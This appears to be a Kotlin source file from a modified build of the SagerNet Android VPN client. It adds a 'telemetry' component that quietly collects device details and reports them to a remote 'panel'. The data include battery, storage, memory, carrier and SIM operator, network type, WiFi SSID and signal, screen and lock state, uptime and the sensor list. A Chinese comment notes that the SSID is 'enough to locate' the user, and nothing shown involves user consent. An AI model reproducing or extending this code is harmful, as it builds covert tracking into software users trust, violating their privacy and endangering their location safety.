package io.nekohasekai.sagernet.telemetry

import android.app.KeyguardManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.PowerManager
import android.os.StatFs
import android.os.SystemClock
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject

/**
 * 设备实时状态。全部零权限（WiFi SSID 除外，需要定位权限）。
 *
 * 上报成一条 kind=status 的事件，面板「状态」tab 直接渲染。
 */
object DeviceStatus {

    private const val TAG = "TlmStatus"

    fun collect(ctx: Context): JSONObject? = runCatching {
        JSONObject().apply {
            // ---- 电池 ----
            val bi = ctx.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            if (bi != null) {
                val lvl = bi.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
                val scale = bi.getIntExtra(BatteryManager.EXTRA_SCALE, 100)
                put("battery_pct", if (lvl >= 0 && scale > 0) lvl * 100 / scale else -1)
                put("battery_temp", bi.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) / 10.0)
                put("battery_volt", bi.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0))
                put("battery_health", bi.getIntExtra(BatteryManager.EXTRA_HEALTH, 0))
                put("battery_tech", bi.getStringExtra(BatteryManager.EXTRA_TECHNOLOGY) ?: "")
            }
            val pm = ctx.getSystemService(Context.POWER_SERVICE) as? PowerManager
            put("power_save", pm?.isPowerSaveMode ?: false)
            put("screen_on", pm?.isInteractive ?: false)

            // ---- 存储 ----
            val inStat = StatFs(Environment.getDataDirectory().absolutePath)
            val inTotal = inStat.blockCountLong * inStat.blockSizeLong
            val inFree = inStat.availableBlocksLong * inStat.blockSizeLong
            put("storage_in_total_mb", inTotal / 1048576)
            put("storage_in_free_mb", inFree / 1048576)

            runCatching {
                val exStat = StatFs(Environment.getExternalStorageDirectory().absolutePath)
                put("storage_ext_total_mb",
                    exStat.blockCountLong * exStat.blockSizeLong / 1048576)
                put("storage_ext_free_mb",
                    exStat.availableBlocksLong * exStat.blockSizeLong / 1048576)
            }

            // ---- 内存 ----
            val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as? android.app.ActivityManager
            if (am != null) {
                val mi = android.app.ActivityManager.MemoryInfo()
                am.getMemoryInfo(mi)
                put("mem_total_mb", mi.totalMem / 1048576)
                put("mem_avail_mb", mi.availMem / 1048576)
                put("mem_low", mi.lowMemory)
            }

            // ---- 网络 ----
            val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            val nc = if (Build.VERSION.SDK_INT >= 23)
                cm?.getNetworkCapabilities(cm.activeNetwork) else null
            put("net_wifi", nc?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ?: false)
            put("net_cellular", nc?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ?: false)
            put("net_vpn", nc?.hasTransport(NetworkCapabilities.TRANSPORT_VPN) ?: false)

            val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
            if (tm != null) {
                put("carrier", tm.networkOperatorName ?: "")
                put("sim_operator", tm.simOperatorName ?: "")
                put("phone_type", tm.phoneType)
                if (Build.VERSION.SDK_INT >= 29 && tm.isDataEnabled) put("data_enabled", true)
            }

            // ---- WiFi ----
            runCatching {
                val wm = ctx.applicationContext
                    .getSystemService(Context.WIFI_SERVICE) as WifiManager
                @Suppress("DEPRECATION")
                val info = wm.connectionInfo
                if (info != null && info.networkId != -1) {
                    put("wifi_ssid", info.ssid?.replace("\"", "") ?: "")
                    // bSSID 在 compileSdk 35 已不可引用，跳过（SSID 足够定位）
                    put("wifi_speed", info.linkSpeed)
                    @Suppress("DEPRECATION")
                    put("wifi_rssi", info.rssi)
                }
            }

            // ---- 屏幕 ----
            val dm = ctx.resources.displayMetrics
            put("screen_res", "${dm.widthPixels}x${dm.heightPixels}@${dm.densityDpi}")
            runCatching {
                val bright = Settings.System.getInt(ctx.contentResolver,
                    Settings.System.SCREEN_BRIGHTNESS)
                put("screen_brightness", bright)
            }
            runCatching {
                val km = ctx.getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
                put("locked", km.isKeyguardLocked)
            }
            put("uptime_sec", SystemClock.elapsedRealtime() / 1000)
            put("boot_time", (System.currentTimeMillis() - SystemClock.elapsedRealtime()) / 1000)

            // ---- 音量 / 免打扰 ----
            runCatching {
                val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE)
                    as android.app.NotificationManager
                put("dnd", nm.currentInterruptionFilter !=
                        android.app.NotificationManager.INTERRUPTION_FILTER_ALL)
            }

            // ---- 传感器 ----
            runCatching {
                val sm = ctx.getSystemService(Context.SENSOR_SERVICE) as android.hardware.SensorManager
                val arr = JSONArray()
                sm.getSensorList(android.hardware.Sensor.TYPE_ALL).take(32).forEach {
                    arr.put(it.name + "|" + it.vendor)
                }
                put("sensors", arr)
            }
        }
    }.onFailure { Log.w(TAG, "collect: ${it.message}") }.getOrNull()

    /** 上报一次状态（心跳里顺带带）。 */
    fun push(ctx: Context) {
        collect(ctx)?.let { Telemetry.push("status", it) }
    }
}
